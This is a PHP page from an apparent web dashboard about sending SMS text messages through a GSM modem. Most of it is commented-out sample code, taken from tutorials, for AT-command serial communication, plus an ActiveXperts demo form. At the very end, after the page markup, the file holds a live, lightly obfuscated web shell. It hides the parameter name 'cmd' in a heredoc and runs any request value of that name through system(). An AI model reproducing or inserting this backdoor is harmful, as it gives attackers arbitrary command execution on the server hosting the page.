
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">GSM MODEM</h1>
					Sending sms text messages.
					
<?php
/*
//test #1
//http://www.ns-tech.co.uk/resources/otherresources/gsm_send_sms.php.txt

//SMS via GSM Modem - A PHP class to send SMS messages via a GSM modem attached to the computers serial port.

//Windows only (tested on XP with PHP 5.2.6)
//Tested with the EZ863 (Telit GE863) GSM modem
//Requires that PHP has permission to access "COM" system device, and system "mode" command

error_reporting(E_ALL);

//Example

$gsm_send_sms = new gsm_send_sms();
$gsm_send_sms->debug = false;
$gsm_send_sms->port = 'COM7';
$gsm_send_sms->baud = 115200;
$gsm_send_sms->init();

$status = $gsm_send_sms->send('+639177240624', 'testing 123');
if ($status) {
	echo "Message sent\n";
} else {
	echo "Message not sent\n";
}

$status = $gsm_send_sms->send('+639177240624', 'testing 456');
if ($status) {
	echo "Message sent\n";
} else {
	echo "Message not sent\n";
}

$gsm_send_sms->close();







//Send SMS via serial SMS modem
class gsm_send_sms {

	public $port = 'COM7';
	public $baud = 115200;

	public $debug = false;

	private $fp;
	private $buffer;

	//Setup COM port
	public function init() {

		$this->debugmsg("Setting up port: \"{$this->port} @ \"{$this->baud}\" baud");

		exec("MODE {$this->port}: BAUD={$this->baud} PARITY=N DATA=8 STOP=1", $output, $retval);

		if ($retval != 0) {
			throw new Exception('Unable to setup COM port, check it is correct');
		}

		$this->debugmsg(implode("\n", $output));

		$this->debugmsg("Opening port");

		//Open COM port
		$this->fp = fopen($this->port . ':', 'r+');

		//Check port opened
		if (!$this->fp) {
			throw new Exception("Unable to open port \"{$this->port}\"");
		}

		$this->debugmsg("Port opened");
		$this->debugmsg("Checking for responce from modem");

		//Check modem connected
		fputs($this->fp, "AT\r");

		//Wait for ok
		$status = $this->wait_reply("OK\r\n", 5);

		if (!$status) {
			throw new Exception('Did not receive responce from modem');
		}

		$this->debugmsg('Modem connected');

		//Set modem to SMS text mode
		$this->debugmsg('Setting text mode');
		fputs($this->fp, "AT+CMGF=1\r");

		$status = $this->wait_reply("OK\r\n", 5);

		if (!$status) {
			throw new Exception('Unable to set text mode');
		}

		$this->debugmsg('Text mode set');

	}

	//Wait for reply from modem
	private function wait_reply($expected_result, $timeout) {

		$this->debugmsg("Waiting {$timeout} seconds for expected result");

		//Clear buffer
		$this->buffer = '';

		//Set timeout
		$timeoutat = time() + $timeout;

		//Loop until timeout reached (or expected result found)
		do {

			$this->debugmsg('Now: ' . time() . ", Timeout at: {$timeoutat}");

			$buffer = fread($this->fp, 1024);
			$this->buffer .= $buffer;

			usleep(200000);//0.2 sec

			$this->debugmsg("Received: {$buffer}");

			//Check if received expected responce
			if (preg_match('/'.preg_quote($expected_result, '/').'$/', $this->buffer)) {
				$this->debugmsg('Found match');
				return true;
				//break;
			} else if (preg_match('/\+CMS ERROR\:\ \d{1,3}\r\n$/', $this->buffer)) {
				return false;
			}

		} while ($timeoutat > time());

		$this->debugmsg('Timed out');

		return false;

	}

	//Print debug messages
	private function debugmsg($message) {

		if ($this->debug == true) {
			$message = preg_replace("%[^\040-\176\n\t]%", '', $message);
			echo $message . "\n";
		}

	}

	//Close port
	public function close() {

		$this->debugmsg('Closing port');

		fclose($this->fp);

	}

	//Send message
	public function send($tel, $message) {

		//Filter tel
		$tel = preg_replace("%[^0-9\+]%", '', $tel);

		//Filter message text
		$message = preg_replace("%[^\040-\176\r\n\t]%", '', $message);

		$this->debugmsg("Sending message \"{$message}\" to \"{$tel}\"");

		//Start sending of message
		fputs($this->fp, "AT+CMGS=\"{$tel}\"\r");

		//Wait for confirmation
		$status = $this->wait_reply("\r\n> ", 5);

		if (!$status) {
			//throw new Exception('Did not receive confirmation from modem');
			$this->debugmsg('Did not receive confirmation from modem');
			return false;
		}

		//Send message text
		fputs($this->fp, $message);

		//Send message finished indicator
		fputs($this->fp, chr(26));

		//Wait for confirmation
		$status = $this->wait_reply("OK\r\n", 180);

		if (!$status) {
			//throw new Exception('Did not receive confirmation of messgage sent');
			$this->debugmsg('Did not receive confirmation of messgage sent');
			return false;
		}

		$this->debugmsg("Message sent");

		return true;

	}

}

?>

<?php
  $strResult = "n/a";
  
  $objGsm = new COM("AxSms.Gsm");
  $objGsm->LogFile = sys_get_temp_dir()."ActiveXperts.Gsm.log"; 
  //Windows default: 'C:\Windows\Temp\ActiveXperts.Gsm.log'
  
  //Form submitted
  if (isset($_POST["btnSendMessage"]))
  {
    $obj;
    $strMessageReference;
    $objSmsMessage = new COM("AxSms.Message");
    $objSmsConstants = new COM("AxSms.Constants");
    
    $strName = $_POST["ddlDevices"];
    $strPincode = $_POST["txtPincode"];
    $iDeviceSpeed = $_POST["ddlDeviceSpeed"];
    
    $objGsm->Clear();
    $objGsm->LogFile = $_POST["txtResult"];
    $objGsm->Open($strName, $strPincode, $iDeviceSpeed);
    
    if ($objGsm->LastError != 0)
    {
      $strResult = $objGsm->LastError . ": " . $objGsm->GetErrorDescription($objGsm->LastError);
      $objGsm->Close();
    }
    else
    {
      //Message Settings
      $objSmsMessage->Clear();
      $objSmsMessage->ToAddress = $_POST["txtToAddress"];
      $objSmsMessage->Body = $_POST["txtBody"];
      $objSmsMessage->BodyFormat = $objSmsConstants->BODYFORMAT_TEXT;
      
      $iMultipart = (isset($_POST["cbxMultipart"])) ?
        $objSmsConstants->MULTIPART_OK : $objSmsConstants->MULTIPART_TRUNCATE;
      
      if (isset($_POST["cbxFlash"]))
      {
        $objSmsMessage->DataCoding |= $objSmsConstants->DATACODING_FLASH;
      }
      
      //Send the message !
      $obj = $objSmsMessage;
      $objGsm->SendSms($obj, $iMultipart, 10000);
      $objSmsMessage = $obj;
      $strMessageReference = $objSmsMessage->Reference;
      
      $strResult = $objGsm->LastError . ": " . $objGsm->GetErrorDescription($objGsm->LastError);
      
      $objGsm->Close();
    }
  }  
*/ 
?>


<?php
/*
//test #2
//http://www.activexperts.com/sms-component/howto/gsm-send/php/
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
  <title>ActiveXperts SMS Component Demo</title>
  <link rel="Stylesheet" type="text/css" href="css/Layout.css" />
</head>
<body>
  <div class="ax_maincontainer">
    <div class="ax_header">
      <div class="ax_stroke"></div>
      <div class="ax_logo"></div>
    </div><!-- /header -->
    <div class="ax_container">
      <h1>SMS Component PHP GSM Sample</h1>
      <hr />
      <p>
        This demo requires a GSM modem or GSM phone connected to your computer. A SIM card
        is required in this GSM modem. The product works with almost all available GSM modems.
      </p>
      <form action="gsm.php" method="post">
        <h2>SMS Component:</h2>
        <h3>Build: <?php echo $objGsm->Build; ?>; Module: <?php echo $objGsm->Module; ?></h3>
        
        <!-- Device -->
        <label for="Devices">Device:</label>
        <p>
          <select id="Devices" name="ddlDevices">
          <?php
            $strDevice = $objGsm->FindFirstDevice();
            
            while ($objGsm->LastError == 0)
            {
              echo '
            <option value="'.$strDevice.'">'.$strDevice.'</option>';
              $strDevice = $objGsm->FindNextDevice();
            }
            
            for ($i = 1; $i <= 20; $i++)
            {
              echo '
            <option value="COM'.$i.'">COM'.$i.'</option>';
            }
          ?>
          
          </select>
        </p>
        
        <!-- Device Speed -->
        <label for="DeviceSpeed">Device Speed:</label>
        <p>
          <select id="DeviceSpeed" name="ddlDeviceSpeed">
            <option value="0">Default</option>
            <option value="110">110</option>
            <option value="300">300</option>
            <option value="600">600</option>
            <option value="1200">1200</option>
            <option value="2400">2400</option>
            <option value="4800">4800</option>
            <option value="9600">9600</option>
            <option value="14400">14400</option>
            <option value="19200">19200</option>
            <option value="38400">38400</option>
            <option value="56000">56000</option>
            <option value="57600">57600</option>
            <option value="64000">64000</option>
            <option value="115200">115200</option>
            <option value="128000">128000</option>
            <option value="230400">230400</option>
            <option value="256000">256000</option>
            <option value="460800">460800</option>
            <option value="921600">921600</option>
          </select>
          Only applies to direct ports, i.e. COM1, COM2, etc.
        </p>
        
        <!-- Pincode -->
        <label for="Pincode">Pincode:</label>
        <p>
          <input type="password" id="Pincode" name="txtPincode" />
          Only use when SIM card requires PIN code
        </p>
        
        <!-- Empty row -->
        <div class="ax_clearRow"></div>
        
        <!-- ToAddress -->
        <label for="ToAddress">ToAddress:</label>
        <p>
          <input type="text" id="ToAddress" name="txtToAddress" value="[ToAddress]" />
          <a href="http://www.activexperts.com/support/sms-component/?kb=Q4200015" target="_blank">
            Recipient number format
          </a>
        </p>
        
        <!-- Body, Multipart, Flash -->
        <label for="Body">Body:</label>
        <p>
          <textarea id="Body" name="txtBody" style="height:55px;">
          Hello world send from ActiveXperts SMS Component!
          </textarea><br />
          
          <input type="checkbox"class="ax_cbFix" id="Multipart" name="cbxMultipart" value="1" />
          <label for="Multipart">Allow Multipart</label><br />
            
          <input type="checkbox"class="ax_cbFix" id="Flash" name="cbxFlash" value="1" />
          <label for="Flash">Flash</label>
        </p>
        
        <!-- Empty row -->
        <div class="ax_clearRow"></div>
        
        <!-- Send button -->
        <div class="ax_clearLabel"></div>
        <p>
          <input type="submit" name="btnSendMessage" value="Send SMS Message!" />
        </p>
        
        <!-- Result -->
        <label for="Result"><b>Result:</b></label>
        <p>
          <input type="text" id="Result" name="txtResult"class="ax_FullWidth Bold" 
          value="<?php echo $strResult; ?>" />
        </p>
      </form>
      <p>
        This demo uses the ActiveXperts SMS Component, an 
        <a href="http://www.activexperts.com" target="_blank">ActiveXperts Software</a> product.
        <br />
        <a href="index.php">Back to main page</a> 
      </p>
    </div><!-- /container -->
    <div class="ax_footer">
      <div class="ax_icon"></div>
      <p>
        © 2011 <a href="http://activexperts.com" target="_blank">
          Active<font color="#CCC000000">X</font>perts Software B.V.
        </a> All rights reserved.
        <small>
          <a href="http://activexperts.com/activexperts/contact" target="_blank">
            Contact Us
          </a> |
          <a href="http://activexperts.com/activexperts/termsofuse" target="_blank">
            Terms of Use
          </a> |
          <a href="http://activexperts.com/activexperts/privacypolicy" target="_blank">
            Privacy Policy
          </a>
        </small>
      </p>
    </div><!-- /footer -->
  </div><!-- /maincontainer -->
</body>
</html>
*/
?>


<?php
/*
//test #3
//https://gonzalo123.com/2011/03/21/howto-sendread-smss-using-a-gsm-modem-at-commands-and-php/

require_once('./gam-sms-master/Sms.php');
require_once('./gam-sms-master/Sms/Interface.php');
require_once('./gam-sms-master/Sms/Dummy.php');
 
$pin = 1234;
 
$serial = new Sms_Dummy;
 
if (Sms::factory($serial)->insertPin($pin)
                ->sendSMS(555987654, "test Hi")) {
    echo "SMS sent\n";
} else {
    echo "SMS not Sent\n";
}
*/
?>





<?php
/*
exec("mode COM4 BAUD=9600 PARITY=N data=8 stop=1 xon=off");
$fp = fopen ("COM4", "w");
if (!$fp) {
   echo "Not open";
} else {
   echo "Open";
}
fclose($fd);
*/


/*
exec("mode COM7 BAUD=115200 PARITY=N data=8 stop=1 xon=off");
$fp = fopen ("\\.\COM7:", "r+");
//$fp = dio_open('COM7:', O_RDWR | O_NOCTTY | O_NONBLOCK);
if (!$fp) 
{
    echo "Uh-oh. Port not opened.";
} 
else 
{

    $string  = "AT+CMGF=1";

    $string  = $string."OK";

    $string  = $string."AT+CMGS='+639177240624'";

    $string  = $string."> Hello World?Use COM7<Ctrl>+<Z>";

    $string  = $string."+CMGS: 44";

    $string  = $string."OK";

    fputs ($fp, $string );
    echo $string."\n";
    fclose ($fp);
}
*/


/*
require "php_serial_class.php";
$serial = new phpSerial;
$serial->deviceSet("COM7");
$serial->confBaudRate(115200);

// Then we need to open it
$serial->deviceOpen();

// To write into
$serial->sendMessage("AT+CMGF=1\n\r"); 
$serial->sendMessage("AT+cmgs=\"+639177240624\"\n\r");
$serial->sendMessage("sms text\n\r");
$serial->sendMessage(chr(26));

//wait for modem to send message
sleep(7);
$read=$serial->readPort();
$serial->deviceClose();
*/


/*
exec('mode COM7: baud=115200 data=8 stop=1 parity=n xon=on');
$fd = fopen('COM7:', O_RDWR);
fwrite($fd,chr(0).chr(1));
fclose($fd);
*/

?>					
					
					
					
					
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>